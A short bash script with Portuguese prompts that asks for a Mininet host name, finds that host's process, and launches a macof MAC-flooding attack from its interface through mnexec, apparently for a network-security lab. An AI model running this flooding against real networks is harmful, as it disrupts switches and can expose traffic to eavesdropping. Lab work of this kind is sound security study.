#!/bin/bash

echo "=== MENU DE ATAQUE MACOF ==="
read -p "Digite o host a ser atacado (ex: h1, h2, h3...): " HOST

# Verifica se o nome segue o padrão hN
if [[ ! $HOST =~ ^h[0-9]+$ ]]; then
    echo "❌ Nome inválido. Use algo como h1, h2, etc."
    exit 1
fi

# Busca o PID do processo associado ao host
PID=$(ps -e -o pid,cmd | grep "mininet:$HOST" | grep -v grep | awk '{print $1}')

if [[ -z "$PID" ]]; then
    echo "❌ Host $HOST não encontrado. Verifique se a topologia está em execução."
    exit 1
fi

echo "✅ Host $HOST encontrado (PID: $PID)"
INTERFACE="${HOST}-eth0"

# Executa o macof via mnexec
echo "➡️ Iniciando ataque com macof na interface $INTERFACE..."
sudo mnexec -a "$PID" macof -i "$INTERFACE"
